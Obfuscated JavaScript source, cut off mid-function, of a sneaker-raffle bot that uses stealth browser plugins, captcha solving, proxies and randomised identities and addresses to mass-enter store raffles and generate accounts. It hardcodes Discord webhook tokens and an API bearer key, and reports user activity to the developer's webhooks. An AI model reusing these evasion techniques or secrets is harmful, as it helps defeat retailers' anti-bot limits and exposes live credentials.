const { EmbedBuilder: _0x27d194 } = require('discord.js');
var _0x5a4029 = require('exe');
const { execFile: _0x5d77b4 } = require('child_process'), _0x4146a9 = require('puppeteer-extra'), _0x47d0c5 = require('puppeteer-extra-plugin-recaptcha'), _0xc40ee6 = require('puppeteer-extra-plugin-stealth'), _0xecbe11 = require('chalk'), _0x42c473 = require('node-bash-title'), _0x5e836d = require('fs'), _0x124c10 = require('axios'), _0x3fd3af = require('papaparse');
var _0x4b7c93 = require('random-name');
const _0x2b8b28 = require('request');
var _0x12b6f6 = require('prompt');
const _0x5d7c39 = _0x2b8b28['jar']();
var _0x32bec3 = {};
const _0x39d1bf = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x4977f2 = '1067398856721051719/2gS-h641y_RoqR-KZ5aOcrnDfvvXNQIz4uQv8eA8A5_nsRSJlaCaStreLwCu5lmUjO4H', _0x4ff63e = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x1c996c = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x5045d1 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x8249c2 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x3179e7 = 'https://discord.com/api/webhooks/', _0x30dfe8 = '' + _0x3179e7 + _0x4ff63e, _0x20d1d0 = '' + _0x3179e7 + _0x1c996c, _0x1e4a2b = '' + _0x3179e7 + _0x39d1bf, _0x49aba5 = '' + _0x3179e7 + _0x4977f2, _0x1fcd8b = '' + _0x3179e7 + _0x5045d1, _0x504cbb = '' + _0x3179e7 + _0x8249c2;
const _0x51fcd5 = JSON['parse'](_0x5e836d['readFileSync']('../package.json', 'utf-8')), _0x37a22d = _0x51fcd5['version'];
var _0x28b8bc, _0x26a868, _0x11caac, _0x40b155, _0x50bec0, _0x3f9b2a, _0x5ce999, _0x2dd0bc;
const _0x1713c9 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x430354 = ![];
const _0x33f393 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x1a4209 = '0123456789';
var _0x1289d4 = _0x33f393['split']('');
const _0x42f7ed = require('auto-git-update'), { PageEmittedEvents: _0x2a8fe5 } = require('puppeteer'), { getRandomValues: _0x19e4f2 } = require('crypto'), { resolve: _0x8e1ce5 } = require('path'), { Console: _0x3038d7 } = require('console'), _0x8b4bcc = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x5a453a = new _0x42f7ed(_0x8b4bcc);
async function _0x1d2b3a() {
    _0x50bec0 = _0x5e836d['readdirSync']('../proxies'), _0x40b155 = _0x5e836d['readdirSync']('../tasks'), _0x32bec3 = JSON['parse'](_0x5e836d['readFileSync']('../settings.json', 'utf-8')), !_0x32bec3['delay'] && (_0x32bec3['delay'] = 0x2710, _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3))), !_0x32bec3['captchaKey'] && (_0x32bec3['captchaKey'] = '', _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3))), !_0x32bec3['useRandomProxy'] && (_0x32bec3['useRandomProxy'] = !![], _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3))), !_0x32bec3['webhook'] && (_0x32bec3['webhook'] = '', _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3))), _0x32bec3['MahaDelay'] = _0x32bec3['delay'], _0x3179e7 = _0x32bec3['webhook'], _0x3f9b2a = _0x32bec3['licenseKey'];
}
let _0x1b8998, _0x516ec2 = [], _0x22916b;
const _0x45ce86 = _0x5456ef => new Promise(_0x2e6a26 => setTimeout(_0x2e6a26, _0x5456ef));
function _0x51920c(_0xe454b3, _0x27e1f1) {
    return Math['floor'](Math['random']() * (_0x27e1f1 - _0xe454b3 + 0x1) + _0xe454b3);
}
async function _0x5c4363(_0x396928) {
    return _0x124c10['get']('https://api.hyper.co/v4/licenses/' + _0x396928, { 'headers': { 'Authorization': 'Bearer\x20' + _0x1713c9 } })['then'](_0x370e25 => _0x370e25['data'])['catch'](() => null);
}
;
async function _0x2f53a6(_0xf2fb82) {
    console['clear']();
    if (_0xf2fb82 == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x29d1b7 = await _0x12b6f6['get']('License');
        if (_0x29d1b7['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x45ce86(0xbb8), _0x2f53a6(_0xf2fb82);
        _0xf2fb82 = _0x29d1b7['License'], _0x32bec3['licenseKey'] = _0xf2fb82, _0x3f9b2a = _0xf2fb82, _0x5e836d['writeFileSync']('../settings.json', JSON['stringify'](_0x32bec3));
    }
    console['log']('Checking\x20license\x20' + _0x3f9b2a + '...'), await _0x45ce86(0x320);
    const _0x396900 = await _0x5c4363(_0xf2fb82);
    _0x5ce999 = JSON['stringify'](_0x396900['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x2dd0bc = JSON['stringify'](_0x396900['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x396900)
        return console['log']('License\x20not\x20found');
    if (!_0x396900['user'])
        return console['log']('License\x20not\x20bound');
    return _0x396900['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x430354 = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x430354 = ![]);
}
async function _0x5a5cad() {
    var _0x385f75 = await _0x12b6f6['get']('Module');
    return console['clear'](), _0x385f75['Module'];
}
;
async function _0x519bf7() {
    var _0x132a5b = await _0x12b6f6['get']('Setting');
    return console['clear'](), _0x132a5b['Setting'];
}
async function _0xa4b4b2() {
    console['clear'](), console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x444f44 = 0x0; _0x444f44 < _0x40b155['length']; _0x444f44++) {
        console['log']('\x20(' + _0x444f44 + ')\x20' + _0x40b155[_0x444f44]);
    }
    console['log']('');
    var _0x503656 = await _0x12b6f6['get']('Task');
    if (_0x503656['Task'] > _0x40b155['length'] - 0x1 || isNaN(_0x503656['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x45ce86(0x3e8), _0xa4b4b2();
    var _0x2e41f6 = _0x5e836d['readFileSync']('../tasks/' + _0x40b155[_0x503656['Task']], 'utf-8');
    return _0x11caac = _0x3fd3af['parse'](_0x2e41f6, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0xecbe11['blue'](_0x40b155[_0x503656['Task']])), _0x28b8bc = _0x40b155[_0x503656['Task']], _0x11caac;
}
async function _0x35374c() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4100de = 0x0; _0x4100de < _0x50bec0['length']; _0x4100de++) {
        console['log']('\x20(' + _0x4100de + ')\x20' + _0x50bec0[_0x4100de]);
    }
    console['log']('');
    var _0x39b7dd = await _0x12b6f6['get']('Proxies');
    if (_0x39b7dd['Proxies'] > _0x50bec0['length'] - 0x1 || isNaN(_0x39b7dd['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x45ce86(0x3e8), _0x35374c();
    var _0x34d66a = _0x5e836d['readFileSync']('../proxies/' + _0x50bec0[_0x39b7dd['Proxies']], 'utf-8')['split']('\x0a');
    let _0x440aa2 = _0x34d66a['map']((_0xf07092, _0x2aa3a8) => {
        sanatizeProxy = _0xf07092['replace']('\x0d', '');
        if (_0x34d66a[_0x2aa3a8 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x26a868 = _0x50bec0[_0x39b7dd['Proxies']], console['clear'](), _0x440aa2;
}
async function _0x18dbd1() {
    var _0x32e3a5 = await _0x12b6f6['get']('Value');
    return console['clear'](), _0x32e3a5['Value'];
}
async function _0x326279(_0x2acee4) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0x5d5fbd = 0x0; _0x5d5fbd < _0x2acee4['length']; _0x5d5fbd++) {
        console['log']('\x20(' + _0x5d5fbd + ')\x20[' + _0x2acee4[_0x5d5fbd]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x1e6226 = await _0x12b6f6['get']('Module');
    return _0x1e6226['Module'];
}
async function _0xde2606() {
    var _0x519fd8 = await _0x12b6f6['get']('Password');
    return console['clear'](), _0x519fd8['Password'];
}
;
async function _0x504840() {
    var _0x25aca6 = await _0x12b6f6['get']('Links');
    return _0x25aca6['Links'];
}
;
async function _0x341727() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x30ffa1 = 0x0; _0x30ffa1 < _0x516ec2['length']; _0x30ffa1++) {
        console['log']('\x20(' + _0x30ffa1 + ')\x20' + _0x516ec2[_0x30ffa1]);
    }
    ;
    console['log']();
    let _0x7b6aa9 = await _0x12b6f6['get']('Product');
    return console['clear'](), _0x7b6aa9['Product'];
}
;
function _0x3b5d06() {
    var _0x310d74 = new Date(Date['now']())['toLocaleTimeString']();
    return _0x310d74;
}
;
const _0x4e2615 = [
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png'
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png'
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png'
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png'
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b'
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'VFB8Tq',
                            'custom_source': 'Air\x20Jordan\x204\x20Seafoam',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'RW67e2',
                                '$consent_form_version': 0x7d2f63,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'WdVw7N',
                            'custom_source': 'DV3742-021',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'S8GH2D',
                                '$consent_form_version': 0x7d9216,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562'
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505'
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x32e91d(_0x4a6009, _0x1a859e) {
    let _0x7f8c4e = { 'headers': { 'content-type': 'application/json' } };
    if (_0x37a22d != 'devkey') {
        await _0x124c10['post'](_0x4a6009, _0x1a859e, _0x7f8c4e);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0x12f7f(_0x5cca40, _0x5b0a9b, _0x1793cf, _0x4c88f5, _0x49c47a) {
    if (!_0x4c88f5 && _0x1793cf == 'dev') {
        var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x5b0a9b['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x5cca40['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x32bec3['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x5ce999,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x5cca40['Url'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0x37a22d,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x255616['data'];
    } else {
        if (_0x4c88f5 && _0x1793cf == 'dev') {
            var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x5ce999,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x5b0a9b['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x5cca40['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x32bec3['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0x49c47a,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x5cca40['Url']
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0x37a22d,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x255616['data'];
        } else {
            if (_0x1793cf == 'pub') {
                var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x5b0a9b['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x5cca40['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x32bec3['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x5cca40['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0x37a22d,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x255616['data'];
            } else {
                if (_0x1793cf == 'acc') {
                    var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x5ce999,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x5b0a9b['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x32bec3['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0x37a22d,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x255616['data'];
                } else {
                    if (_0x1793cf == 'open') {
                        var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2dd0bc)['addFields']({
                            'name': 'User',
                            'value': '' + _0x5ce999,
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0x37a22d,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x255616['data'];
                    } else {
                        if (!_0x4c88f5 && _0x1793cf == 'ver') {
                            var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
                                'name': 'User',
                                'value': '' + _0x5ce999,
                                'inline': !![]
                            }, {
                                'name': 'Store',
                                'value': '' + _0x5b0a9b['store'],
                                'inline': !![]
                            }, {
                                'name': 'Delay',
                                'value': '' + _0x32bec3['delay'],
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0x37a22d,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x255616['data'];
                        } else {
                            if (_0x4c88f5 && _0x1793cf == 'ver') {
                                var _0x255616 = new _0x27d194()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x5b0a9b['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x5ce999,
                                    'inline': !![]
                                }, {
                                    'name': 'Error',
                                    'value': '' + _0x49c47a,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x5b0a9b['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x32bec3['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0x37a22d,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x255616['data'];
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x10d7a7(_0x272869, _0x362071) {
    var _0x231bf4 = _0x272869[_0x362071]['Address1']['split'](''), _0x51dc01 = _0x272869[_0x362071]['Address2']['split'](''), _0x4123fe = _0x272869[_0x362071]['Email']['split']('@');
    for (var _0x4077f6 = 0x0; _0x4077f6 < _0x231bf4['length']; _0x4077f6++) {
        if (_0x231bf4[_0x4077f6] == 'X') {
            var _0x469319 = Math['round'](Math['random']() * (_0x33f393['length'] - 0x1));
            _0x231bf4[_0x4077f6] = _0x1289d4[_0x469319];
        }
    }
    ;
    for (var _0x4077f6 = 0x0; _0x4077f6 < _0x51dc01['length']; _0x4077f6++) {
        if (_0x51dc01[_0x4077f6] == 'X') {
            var _0x469319 = Math['round'](Math['random']() * (_0x33f393['length'] - 0x1));
            _0x51dc01[_0x4077f6] = _0x1289d4[_0x469319];
        }
    }
    ;
    _0x272869[_0x362071]['FirstName'] == 'RANDOM' && (_0x272869[_0x362071]['FirstName'] = _0x4b7c93['first']());
    _0x272869[_0x362071]['LastName'] == 'RANDOM' && (_0x272869[_0x362071]['LastName'] = _0x4b7c93['last']());
